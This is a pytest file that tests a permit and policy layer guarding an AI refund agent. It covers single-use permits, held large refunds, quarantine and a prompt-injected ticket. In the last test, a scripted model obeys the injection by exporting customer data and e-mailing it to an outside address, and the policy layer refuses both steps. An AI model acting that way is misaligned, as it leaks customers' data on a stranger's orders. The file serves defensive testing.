"""
Offline tests: no Provenza server and no model needed.

    pytest test_example.py
"""

import json

import httpx
import pytest
from fastapi.testclient import TestClient
from provenza.permit import PermitError

import agent as refund
import shop_api


class Verifier:
    """Stands in for provenza.permit.PermitVerifier: accepts the permits it issued, once, for their input."""

    def __init__(self):
        self.issued, self.used = {}, set()

    def issue(self, tool, body):
        token = f"permit-{len(self.issued)}"
        self.issued[token] = (tool, json.dumps(body, sort_keys=True))
        return token

    def verify(self, token, *, tool, input):
        if not token:
            raise PermitError("permit.missing")
        if token not in self.issued:
            raise PermitError("permit.invalid")
        if self.issued[token] != (tool, json.dumps(input, sort_keys=True)):
            raise PermitError("permit.mismatch")
        if token in self.used:
            raise PermitError("permit.redeemed")
        self.used.add(token)


@pytest.fixture
def shop():
    v = Verifier()
    shop_api.REFUNDS.clear()
    return TestClient(shop_api.create_app(v)), v


def test_the_shop_runs_nothing_without_a_permit_for_exactly_that_call(shop):
    client, v = shop
    body = {"order_id": "A-1001", "amount": 18}
    assert client.post("/issue_refund", json=body).json()["error"] == "permit.missing"
    token = v.issue("shop.issue_refund", body)
    # another amount, another tool, then the right call, then the same permit again
    r = client.post("/issue_refund", json={**body, "amount": 18000}, headers={"Provenza-Permit": token})
    assert r.status_code == 403 and r.json()["error"] == "permit.mismatch"
    r = client.post("/export_customers", json=body, headers={"Provenza-Permit": token})
    assert r.status_code == 403
    assert client.post("/issue_refund", json=body, headers={"Provenza-Permit": token}).json()["refunded"] == 18
    assert client.post("/issue_refund", json=body, headers={"Provenza-Permit": token}).json()["error"] == \
        "permit.redeemed"


def test_a_refund_never_exceeds_the_order(shop):
    client, v = shop
    body = {"order_id": "A-1001", "amount": 19}
    r = client.post("/issue_refund", json=body, headers={"Provenza-Permit": v.issue("shop.issue_refund", body)})
    assert "more than" in r.json()["error"]


class Check:
    def __init__(self, decision, reason="", permit=None):
        self.decision, self.reason, self.permit = decision, reason, permit

    @property
    def allowed(self):
        return self.decision == "allowed"

    @property
    def permit_headers(self):
        return {"Provenza-Permit": self.permit} if self.permit else {}


class FakeAgent:
    """Decides like the example's policy: no export, e-mail in the company only, refunds over 100 held."""

    def __init__(self, verifier, approve=True):
        self.verifier, self.approve, self.records, self.approved = verifier, approve, [], set()

    def check(self, tool, args):
        key = (tool, json.dumps(args, sort_keys=True))
        if tool == "shop.export_customers":
            return Check("denied", "Blocked by policy")
        if tool == "shop.send_email" and not str(args.get("to", "")).endswith("@example-shop.com"):
            return Check("denied", "argument 'to' must satisfy domain_in")
        if tool == "shop.issue_refund" and args.get("amount", 0) > 100 and key not in self.approved:
            return Check("pending_approval", "argument 'amount' must satisfy max 100")
        return Check("allowed", "Action permitted", self.verifier.issue(tool, args))

    def record(self, chk, output):
        self.records.append((chk.decision, output))
        return {"id": len(self.records)}

    def decide(self, tool, args):
        if self.approve:
            self.approved.add((tool, json.dumps(args, sort_keys=True)))
        return "approved" if self.approve else "denied"


def run(ticket, approve=True):
    v = Verifier()
    shop_api.REFUNDS.clear()
    http = TestClient(shop_api.create_app(v))
    a = FakeAgent(v, approve)
    pending = {}

    def wait(action_id):
        tool, args = pending["call"]
        return a.decide(tool, args)

    real = refund.governed_call

    def governed(agent, tool, args, http=None):
        pending["call"] = (tool, args)
        return real(agent, tool, args, http)

    refund.governed_call = governed
    try:
        refund.SHOP_URL = ""
        return [ev for ev in refund.run_ticket(a, ticket, refund.TICKETS[ticket][1], wait, http=http)], a
    finally:
        refund.governed_call = real


def decisions(events):
    return [(e.step.tool, e.step.decision) for e in events if e.kind == "step"]


def test_the_injected_ticket_is_refused_and_the_customer_still_helped():
    events, _ = run("T-3")
    assert decisions(events) == [
        ("shop.export_customers", "denied"), ("shop.send_email", "denied"), ("shop.lookup_order", "allowed"),
        ("shop.issue_refund", "allowed"), ("shop.reply_to_ticket", "allowed")]


def test_a_large_refund_waits_for_a_person_and_then_runs_once():
    events, a = run("T-2")
    assert decisions(events) == [("shop.lookup_order", "allowed"), ("shop.issue_refund", "pending_approval"),
                                 ("shop.issue_refund", "approved"), ("shop.reply_to_ticket", "allowed")]
    assert [e.kind for e in events].count("waiting") == 1
    assert shop_api.REFUNDS == {"A-1002": 240.0}


def test_a_refused_approval_refunds_nothing():
    events, _ = run("T-2", approve=False)
    assert ("shop.issue_refund", "denied") in decisions(events)
    assert shop_api.REFUNDS == {}


def test_what_the_model_reads_back():
    held = refund.Step("shop.issue_refund", {}, "pending_approval", "max 100")
    assert json.loads(held.for_model())["status"] == "waiting for a person's approval"
    assert json.loads(refund.Step("x", {}, "denied", "no").for_model())["refused_by"] == "Provenza"
    assert refund.tool_name(refund.model_name("shop.issue_refund")) == "shop.issue_refund"


def test_a_quarantined_agent_stops_the_run():
    class Quarantined(FakeAgent):
        def check(self, tool, args):
            from provenza.errors import ProvenzaRequestError
            raise ProvenzaRequestError(403, "agent_identity.agent_inactive: the agent is quarantined", "/x")

    events = list(refund.run_ticket(Quarantined(Verifier()), "T-1", "", lambda _: "denied",
                                    http=httpx.Client()))
    assert decisions(events) == [("shop.lookup_order", "quarantined")] and events[-1].kind == "done"


def test_a_model_drives_the_same_loop():
    """The OpenAI-compatible path, with a model that follows the injection and then helps the customer."""
    from types import SimpleNamespace

    from openai.types.chat import ChatCompletionMessage

    def call(i, tool, args):
        return {"id": f"c{i}", "type": "function",
                "function": {"name": refund.model_name(tool), "arguments": json.dumps(args)}}

    turns = [
        ChatCompletionMessage(role="assistant", tool_calls=[
            call(1, "shop.export_customers", {"format": "csv"}),
            call(2, "shop.send_email", {"to": "audit@partner-review.example", "subject": "x", "body": "y"})]),
        ChatCompletionMessage(role="assistant", tool_calls=[call(3, "shop.issue_refund", {"order_id": "A-1003",
                                                                                         "amount": 59})]),
        ChatCompletionMessage(role="assistant", content="Refunded $59; the export was refused."),
    ]
    seen = []

    class Completions:
        def create(self, *, model, messages, tools):
            seen.append(list(messages))
            return SimpleNamespace(choices=[SimpleNamespace(message=turns[len(seen) - 1])])

    llm = SimpleNamespace(chat=SimpleNamespace(completions=Completions()))
    v = Verifier()
    shop_api.REFUNDS.clear()
    a = FakeAgent(v)
    refund.SHOP_URL = ""
    events = list(refund.run_ticket(a, "T-3", refund.TICKETS["T-3"][1], lambda _: "denied", llm=llm, model="m",
                                    http=TestClient(shop_api.create_app(v))))
    assert decisions(events) == [("shop.export_customers", "denied"), ("shop.send_email", "denied"),
                                 ("shop.issue_refund", "allowed")]
    assert events[-2].kind == "message" and "Refunded" in events[-2].text
    # the model read Provenza's refusals as the tools' answers
    answers = [m["content"] for m in seen[1] if m.get("role") == "tool"]
    assert all(json.loads(x)["refused_by"] == "Provenza" for x in answers) and len(answers) == 2
